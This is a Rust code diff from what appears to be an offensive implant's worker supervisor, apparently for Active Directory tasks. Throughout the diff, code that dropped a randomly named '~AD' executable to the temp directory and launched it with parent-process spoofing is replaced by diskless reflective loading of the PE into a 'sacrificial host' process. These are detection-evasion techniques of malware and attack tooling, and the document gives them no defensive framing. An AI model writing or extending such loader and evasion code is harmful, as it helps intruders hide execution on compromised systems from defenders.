@@ -4,30 +4,15 @@
 //! lives only in the worker binary; this module only frames, spawns, and collects.
 
 use super::{
-    clamp_worker_deadline_ms, err_result, should_force_kill_on_wait, supervisor,
-    DROPPED_WORKER_OUTPUTS, MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES, WORKER_TIMEOUTS,
+    err_result, supervisor,
+    MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES, WORKER_TIMEOUTS,
 };
-#[cfg(windows)]
-use super::force_kill;
 use crate::types::CommandResult;
-#[cfg(windows)]
-use log::{info, warn};
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use std::sync::atomic::Ordering;
 
 #[cfg(windows)]
-fn write_temp_ad_host(pe: &[u8]) -> Result<std::path::PathBuf, String> {
-    let mut dir = std::env::temp_dir();
-    let name = format!(
-        "~AD{:08X}{:04X}.exe",
-        crate::utils::next_u32(),
-        (crate::utils::next_u32() & 0xffff) as u16
-    );
-    dir.push(name);
-    std::fs::write(&dir, pe).map_err(|e| format!("write ad host: {e}"))?;
-    Ok(dir)
-}
 
 /// Request body written after `u32le` length prefix (UTF-8 JSON).
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -231,106 +216,22 @@ fn run_ad_worker(json_body: &[u8], deadline_ms: u64) -> CommandResult {
     frame.extend_from_slice(&(json_body.len() as u32).to_le_bytes());
     frame.extend_from_slice(json_body);
 
-    let job = super::job_object::JobObject::create();
-    // Use .exe suffix — some Windows policies refuse CreateProcess on .tmp images.
-    let path = match write_temp_ad_host(&pe) {
-        Ok(p) => p,
-        Err(e) => return err_result(e),
-    };
-    let cmdline = format!("\"{}\"", path.to_string_lossy());
-    // Prefer plain piped spawn for reliable stdin job frames; fall back to PPID spoof.
-    let parent = crate::isolated_exec::pick_parent_for_supervisor();
-    let child = match crate::native::spawn::spawn_piped_plain(&cmdline) {
-        Ok(c) => c,
-        Err(e_plain) => {
-            match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
-                Ok(c) => c,
-                Err(e) => {
-                    let _ = std::fs::remove_file(&path);
-                    return err_result(format!("spawn ad worker: plain={e_plain}; spoof={e}"));
-                }
+    // reflective load into sacrificial host (no disk write)
+    let host_exe = crate::module_supervisor::pick_host_for_worker();
+    match crate::img_load::spawn_reflective_worker(
+        &pe,
+        &frame,
+        deadline_ms,
+        &format!("\"{host_exe}\""),
+    ) {
+        Ok((out, _err)) => {
+            // AD worker protocol: `u32le_len || JSON_utf8`. `out` carries the frame.
+            match parse_ad_response_frame(&out) {
+                Ok(resp) => map_ad_worker_response(resp),
+                Err(e) => err_result(e),
             }
         }
-    };
-    if let Some(ref j) = job {
-        if j.assign_process(child.h_process).is_err() {
-            warn!("[supervisor] ad AssignProcessToJobObject failed — kill uncontained worker");
-            let _ = crate::native::terminate_process_handle(child.h_process);
-            let _ = crate::native::close_handle(child.stdin_write);
-            let _ = crate::native::close_handle(child.stdout_read);
-            let _ = crate::native::close_handle(child.h_process);
-            let _ = std::fs::remove_file(&path);
-            return err_result("worker isolation setup failed");
-        }
-    } else {
-        let _ = crate::native::terminate_process_handle(child.h_process);
-        let _ = crate::native::close_handle(child.stdin_write);
-        let _ = crate::native::close_handle(child.stdout_read);
-        let _ = crate::native::close_handle(child.h_process);
-        let _ = std::fs::remove_file(&path);
-        return err_result("worker isolation unavailable");
-    }
-    info!("[supervisor] ad worker pid={}", child.pid);
-
-    let write_res = crate::native::pipe_write_all(child.stdin_write, &frame);
-    let _ = crate::native::close_handle(child.stdin_write);
-    if let Err(e) = write_res {
-        force_kill(child.h_process, &job);
-        let _ = crate::native::close_handle(child.stdout_read);
-        let _ = crate::native::close_handle(child.h_process);
-        let _ = std::fs::remove_file(&path);
-        return err_result(e);
-    }
-
-    let stdout_read = child.stdout_read;
-    let max_out = MAX_OUTPUT_BYTES;
-    let reader = std::thread::spawn(move || -> Result<Vec<u8>, String> {
-        let hdr = crate::native::pipe_read_exact(stdout_read, 4)?;
-        let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
-        if out_len > max_out * 2 {
-            return Err("worker output too large".into());
-        }
-        let body = crate::native::pipe_read_exact(stdout_read, out_len)?;
-        let _ = crate::native::close_handle(stdout_read);
-        let mut full = Vec::with_capacity(4 + body.len());
-        full.extend_from_slice(&hdr);
-        full.extend_from_slice(&body);
-        Ok(full)
-    });
-
-    let wait_ms = clamp_worker_deadline_ms(deadline_ms);
-    let ok = crate::native::wait_for_single_object_timeout(child.h_process, wait_ms);
-    if should_force_kill_on_wait(ok) {
-        WORKER_TIMEOUTS.fetch_add(1, Ordering::Relaxed);
-        force_kill(child.h_process, &job);
-        let _ = crate::native::close_handle(child.h_process);
-        let _ = std::fs::remove_file(&path);
-        let _ = reader.join();
-        return err_result("worker timeout");
-    }
-
-    let read_result = match reader.join() {
-        Ok(r) => r,
-        Err(_) => {
-            let _ = crate::native::close_handle(child.h_process);
-            let _ = std::fs::remove_file(&path);
-            return err_result("worker reader panicked");
-        }
-    };
-    let _ = crate::native::close_handle(child.h_process);
-    let _ = std::fs::remove_file(&path);
-
-    match read_result {
-        Ok(frame) => match parse_ad_response_frame(&frame) {
-            Ok(resp) => map_ad_worker_response(resp),
-            Err(e) => err_result(e),
-        },
-        Err(e) => {
-            if e.contains("too large") {
-                DROPPED_WORKER_OUTPUTS.fetch_add(1, Ordering::Relaxed);
-            }
-            err_result(e)
-        }
+        Err(e) => err_result(format!("ad worker: {e}")),
     }
 }
 
